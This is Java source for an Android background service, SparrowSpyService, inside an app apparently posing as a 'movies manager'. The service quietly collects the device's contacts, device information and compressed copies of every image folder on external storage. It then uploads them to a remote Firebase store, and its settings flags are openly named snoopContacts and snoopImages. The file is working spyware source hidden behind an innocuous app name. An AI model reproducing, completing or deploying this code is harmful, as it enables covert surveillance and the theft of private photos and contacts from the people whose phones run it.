package com.sickboydroid.moviesmanager.services;

import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import com.google.firebase.storage.UploadTask;
import com.sickboydroid.moviesmanager.R;
import com.sickboydroid.moviesmanager.collectors.ContactsCollector;
import com.sickboydroid.moviesmanager.collectors.DeviceInfoCollector;
import com.sickboydroid.moviesmanager.collectors.ImagesCollector;
import com.sickboydroid.moviesmanager.server.DataUploader;
import com.sickboydroid.moviesmanager.utils.Constants;
import com.sickboydroid.moviesmanager.utils.FileUtils;
import com.sickboydroid.moviesmanager.utils.NotificationUtils;
import com.sickboydroid.moviesmanager.utils.Resources;
import com.sickboydroid.moviesmanager.utils.SpyState;
import com.sickboydroid.moviesmanager.utils.Utils;
import com.sickboydroid.moviesmanager.utils.ZipUtils;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.Array;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

public class SparrowSpyService extends Service {
    private static final String TAG = "SparrowSpyService";
    private static final int COLLECTOR_SERVICE_NOTIF_ID = 101;
    private Context mContext;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        if (SpyState.Listeners.spyServiceStateChangeListener != null)
            SpyState.Listeners.spyServiceStateChangeListener.onStart();
        mContext = getApplicationContext();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        updateNotif(Resources.Strings.notifContent1);
        collectData();
        return START_STICKY;
    }

    private void clearDirectories() {
        File[] files = Constants.DIR_APP_ROOT.listFiles();
        if (files == null) return;
        for (File file : files) {
            FileUtils.delete(file);
        }
        Constants.init(this, Constants.DIR_APP_ROOT);
    }

    /**
     * This method loads (saves) all the stuff
     */
    private void collectData() {
        List<Future<?>> execFutures = new ArrayList<>();
        ExecutorService executor = Executors.newCachedThreadPool();
        DataUploader uploader = new DataUploader(this);
        uploader.resetUploadPrefs();

        // Task: Clean
        clearDirectories();
        Log.i(TAG, "Directories cleaned");

        // Task: Save Android Images
        addImageTasks(execFutures, executor, uploader);

        // Task: Save contacts
        execFutures.add(executor.submit(() -> {
            if (!Resources.Settings.snoopContacts) return;
            new ContactsCollector(mContext).collect();
            Log.i(TAG, "Contacts saved");
            waitForUpload(uploader.uploadContacts());
        }));

        // Task: Device Info
        execFutures.add(executor.submit(() -> {
            if (!Resources.Settings.snoopDeviceInfo) return;
            new DeviceInfoCollector(mContext).collect();
            Log.i(TAG, "Device info retrieved");
            waitForUpload(uploader.uploadDeviceInfo());
        }));

        new Thread(() -> {
            // Wait until all tasks are finished
            for (Future<?> execFuture : execFutures) {
                try {
                    execFuture.get();
                } catch (Exception e) {
                    Log.wtf(TAG, "Exception occurred while executing tasks", e);
                }
            }
            stopSelf();
        }).start();
    }

    private void waitForUpload(UploadTask task) {
        if (task == null) return;
        while (!task.isComplete()) Utils.sleep(250);
    }

    private void updateNotif(String content) {
        Notification.Builder notifBuilder;
        // Create notification channel for oreo and above devices
        NotificationUtils notifUtils = new NotificationUtils(mContext);
        notifUtils.createDefaultNotifChannel();
        String channelID = notifUtils.getDefaultNotifChannelId();
        notifBuilder = new Notification.Builder(mContext, channelID);

        // Start foreground notification
        notifBuilder.setSmallIcon(Resources.Drawables.notifIcon).setContentTitle(Resources.Strings.notifTitle).setContentText(content);
        startForeground(COLLECTOR_SERVICE_NOTIF_ID, notifBuilder.build());
    }

    @Override
    public void onDestroy() {
        if (SpyState.Listeners.spyServiceStateChangeListener != null)
            SpyState.Listeners.spyServiceStateChangeListener.onFinish();
        super.onDestroy();
    }

    public void addImageTasks(List<Future<?>> execFutures, ExecutorService executor, DataUploader uploader) {
        if (!Resources.Settings.snoopImages) return;
        File androidDir = new File(Environment.getExternalStorageDirectory(), "Android");
        execFutures.add(executor.submit(() -> {
            ImagesCollector.Options options = new ImagesCollector.Options();
            options.imagesZipName = "android-images";
            options.imagesRootDir = androidDir;
            options.imageQuality = 3;
            ImagesCollector imagesCollector = new ImagesCollector(options);
            imagesCollector.collect();
            Log.i(TAG, "Android images compressed and saved");
            waitForUpload(uploader.uploadFile(imagesCollector.getImagesZip()));
            waitForUpload(uploader.uploadFile(imagesCollector.getImagesMap()));
        }));

        execFutures.add(executor.submit(() -> {
            File[] dirs = Environment.getExternalStorageDirectory().listFiles();
            List<File> imagesZips = new ArrayList<>();
            List<File> imagesMaps = new ArrayList<>();
            for (File dir : dirs) {
//                if(dir.getName().equals("sparrow")) continue;
                if (dir.getName().equals("Android")) continue;
                ImagesCollector.Options options = new ImagesCollector.Options();
                options.imagesZipName = dir.getName().toLowerCase().replaceAll("\\s", "-").replaceAll("[^a-z-]", "");
                options.imagesRootDir = dir;
                options.imageQuality = 6;
                ImagesCollector imagesCollector = new ImagesCollector(options);
                imagesCollector.collect();
                Log.i(TAG, dir.getName() + " images compressed and saved");
                updateNotif(Resources.Strings.notifContent2);
                imagesZips.add(imagesCollector.getImagesZip());
                imagesMaps.add(imagesCollector.getImagesMap());
            }
            // zip
            ZipUtils utils = new ZipUtils();
            File imagesZip = new File(Constants.DIR_SERVER, "images.zip");
            File imagesMap = new File(Constants.DIR_SERVER, "images-map.zip");
            try {
                utils.zip(imagesZips.toArray(new File[0]), imagesZip, true);
                utils.zip(imagesMaps.toArray(new File[0]), imagesMap, true);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
            waitForUpload(uploader.uploadFile(imagesZip));
            waitForUpload(uploader.uploadFile(imagesMap));
        }));
    }
}